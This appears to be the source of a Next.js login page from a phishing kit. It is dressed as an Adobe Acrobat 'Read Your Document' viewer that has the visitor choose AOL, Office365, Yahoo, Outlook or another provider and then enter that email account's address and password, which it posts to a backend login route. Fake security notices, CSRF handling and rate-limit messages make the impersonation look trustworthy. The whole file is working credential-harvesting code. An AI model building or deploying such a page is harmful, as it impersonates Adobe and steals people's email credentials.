"use client";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

const providers = [
  { id: "aol", name: "AOL", icon: "/aol.svg" },
  { id: "office365", name: "Office365", icon: "/office365.svg" },
  { id: "yahoo", name: "Yahoo", icon: "/yahoo.svg" },
  { id: "outlook", name: "Outlook", icon: "/outlook.svg" },
  { id: "others", name: "Others", icon: "/email.svg" }
];

export default function LoginPage() {
  const [selectedProvider, setSelectedProvider] = useState(null);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [csrfToken, setCsrfToken] = useState("");
  const [rateLimitInfo, setRateLimitInfo] = useState(null);
  const router = useRouter();

  // Get CSRF token on component mount
  useEffect(() => {
    const getCsrfToken = async () => {
      try {
        const response = await fetch('/api/auth/csrf');
        const data = await response.json();
        if (data.success) {
          setCsrfToken(data.csrfToken);
        }
      } catch (error) {
        console.error('Failed to get CSRF token:', error);
      }
    };
    getCsrfToken();
  }, []);

  const handleProvider = (providerId) => {
    setSelectedProvider(providerId);
    setError("");
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError("");
    setLoading(true);
    setRateLimitInfo(null);

    try {
      const res = await fetch("/api/auth/login", {
        method: "POST",
        headers: { 
          "Content-Type": "application/json",
          "X-CSRF-Token": csrfToken
        },
        body: JSON.stringify({
          email,
          password,
          provider: selectedProvider,
          csrfToken
        }),
        credentials: 'include'
      });

      const data = await res.json();

      if (res.status === 429) {
        setRateLimitInfo({
          message: data.message,
          resetTime: new Date(data.resetTime)
        });
        setError(data.message);
      } else if (res.status === 423) {
        setError(`Account locked: ${data.message}`);
      } else if (data.success) {
        // Update CSRF token for future requests
        setCsrfToken(data.csrfToken);
        router.push("/dashboard");
      } else {
        setError(data.message || "Login failed. Please check your credentials.");
        
        // Show validation errors if present
        if (data.errors && data.errors.length > 0) {
          const errorMessages = data.errors.map(err => err.message).join(', ');
          setError(errorMessages);
        }
      }
    } catch (error) {
      setError("Network error. Please try again.");
      console.error('Login error:', error);
    } finally {
      setLoading(false);
    }
  };

  const formatTimeRemaining = (resetTime) => {
    const now = new Date();
    const diff = resetTime - now;
    const minutes = Math.ceil(diff / (1000 * 60));
    return minutes > 0 ? `${minutes} minute${minutes !== 1 ? 's' : ''}` : 'shortly';
  };

  return (
    <div className="adobe-cloud-main" style={{ minHeight: '100vh', position: 'relative' }}>
      <div className="blurry-bg" />
      <form
        className="adobe-panel move-down"
        style={{
          position: "relative",
          zIndex: 2,
          minHeight: selectedProvider ? 480 : 360,
          display: "flex",
          flexDirection: "column",
          justifyContent: "start",
          alignItems: "stretch"
        }}
        onSubmit={handleSubmit}
        autoComplete="off"
      >
        {/* Header */}
        <div className="top-header-row" style={{ marginBottom: "2.2rem" }}>
          <img src="/acrobat-logo.svg" className="acrobat-logo-left" alt="Adobe Acrobat" />
          <span className="top-header-title" style={{ fontSize: "1.5rem", fontWeight: 700, color: "#f40f02" }}>
            Read Your Document
          </span>
        </div>

        {!selectedProvider ? (
          <>
            <div style={{ textAlign: "center", marginBottom: "2rem", fontSize: "1.1rem" }}>
              Select email provider
            </div>
            <div style={{
              display: "flex",
              flexWrap: "wrap",
              gap: "1rem",
              justifyContent: "center",
              marginBottom: "0.5rem"
            }}>
              {providers.map((prov) => (
                <button
                  key={prov.id}
                  type="button"
                  className="provider-btn"
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: "0.7rem",
                    fontSize: "1.04rem",
                    fontWeight: 500,
                    background: "#fff",
                    color: "#333",
                    border: "1.5px solid #ccc",
                    borderRadius: "8px",
                    padding: "0.7rem 1.7rem",
                    cursor: "pointer",
                    minWidth: 140,
                    boxShadow: "0 2px 8px rgba(0,0,0,0.04)"
                  }}
                  onClick={() => handleProvider(prov.id)}
                >
                  <img src={prov.icon} alt={prov.name} style={{ width: 26, height: 26 }} />
                  {prov.name}
                </button>
              ))}
            </div>
          </>
        ) : (
          <>
            <div style={{
              display: "flex",
              alignItems: "center",
              gap: "0.8rem",
              marginBottom: "1.3rem",
              justifyContent: "center"
            }}>
              <img
                src={providers.find(p => p.id === selectedProvider)?.icon}
                alt={providers.find(p => p.id === selectedProvider)?.name}
                style={{ width: 28, height: 28 }}
              />
              <span style={{ fontWeight: 600, fontSize: "1.09rem", color: "#444" }}>
                {providers.find(p => p.id === selectedProvider)?.name} Login
              </span>
            </div>

            {/* Security Notice */}
            <div style={{
              background: "#f0f8ff",
              border: "1px solid #b3d9ff",
              borderRadius: "6px",
              padding: "0.75rem",
              marginBottom: "1rem",
              fontSize: "0.9rem",
              color: "#0066cc"
            }}>
              🔒 Secure login with enterprise-grade protection
            </div>

            <input
              type="email"
              placeholder="Email address"
              value={email}
              autoComplete="username"
              onChange={e => setEmail(e.target.value)}
              required
              style={{
                marginBottom: "0.5rem"
              }}
            />
            
            <div style={{ position: "relative", width: "100%", marginBottom: "0.5rem" }}>
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                value={password}
                autoComplete="current-password"
                onChange={e => setPassword(e.target.value)}
                required
                style={{ paddingRight: "2.5rem" }}
              />
              <button
                type="button"
                aria-label={showPassword ? "Hide password" : "Show password"}
                onClick={() => setShowPassword(p => !p)}
                tabIndex={-1}
                style={{
                  position: "absolute",
                  right: "0.5rem",
                  top: "50%",
                  transform: "translateY(-50%)",
                  background: "none",
                  border: "none",
                  padding: 0,
                  cursor: "pointer",
                  color: "#888",
                  fontSize: "1rem"
                }}
              >
                {showPassword ? "🙈" : "👁️"}
              </button>
            </div>

            {/* Rate Limit Warning */}
            {rateLimitInfo && (
              <div style={{
                background: "#fff3cd",
                border: "1px solid #ffeaa7",
                borderRadius: "6px",
                padding: "0.75rem",
                marginBottom: "1rem",
                fontSize: "0.9rem",
                color: "#856404"
              }}>
                ⚠️ Too many attempts. Try again in {formatTimeRemaining(rateLimitInfo.resetTime)}.
              </div>
            )}

            <button 
              type="submit" 
              disabled={loading || !csrfToken}
              style={{ 
                marginTop: "1rem",
                opacity: (loading || !csrfToken) ? 0.7 : 1
              }}
            >
              {loading ? <span className="spinner" /> : "Sign in"}
            </button>

            {error && (
              <div style={{ 
                color: "#f40f02", 
                marginTop: "1rem",
                padding: "0.75rem",
                background: "#ffebee",
                border: "1px solid #ffcdd2",
                borderRadius: "6px",
                fontSize: "0.9rem"
              }}>
                {error}
              </div>
            )}

            <button
              type="button"
              style={{
                background: "none",
                border: "none",
                color: "#1976d2",
                marginTop: "1.5rem",
                textDecoration: "underline",
                cursor: "pointer"
              }}
              onClick={() => {
                setSelectedProvider(null);
                setEmail("");
                setPassword("");
                setError("");
                setRateLimitInfo(null);
              }}
            >
              ← Back to provider select
            </button>
          </>
        )}
      </form>
      
      <div className="adobe-incorporated">
        © 2025 Adobe Incorporated. All rights reserved.
      </div>
      
      <style jsx>{`
        .blurry-bg {
          position: absolute;
          z-index: 1;
          top: 0;
          left: 0;
          width: 100vw;
          height: 100vh;
          background: url('/bg.jpg') no-repeat center center fixed;
          background-size: cover;
          filter: blur(10px) brightness(0.85);
          opacity: 0.98;
        }
        .spinner {
          width: 24px;
          height: 24px;
          border: 4px solid rgba(0,0,0,0.1);
          border-top: 4px solid #f40f02;
          border-radius: 50%;
          animation: spin 1s linear infinite;
          display: inline-block;
        }
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}